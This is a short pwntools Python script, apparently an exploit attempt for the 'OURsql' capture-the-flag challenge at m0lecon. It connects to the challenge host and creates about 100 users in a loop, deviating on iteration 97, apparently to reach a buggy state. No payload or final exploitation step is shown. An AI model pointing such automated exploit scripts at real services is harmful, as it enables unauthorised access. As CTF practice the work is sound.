from pwn import *

pp = remote("oursql.challs.m0lecon.it", 31341)
# pp = process(["./OURsql", "db.txt"])
for i in range(0, 100):
    log.warn(f"creating user {i}")
    pp.recv()
    # pp.recvuntil(b"choise:")
    pp.sendline(b"1")
    # pp.recvuntil(b"name: ")
    # print(pp.recv())
    pp.sendline(b"khtek")
    # pp.recvuntil(b"word: ")
    # print(pp.recv())
    pp.sendline(b"khtek")
    # pp.recvuntil(b"choise:")
    print(pp.recv())
    if (i != 97):
        pp.sendline(b"4")

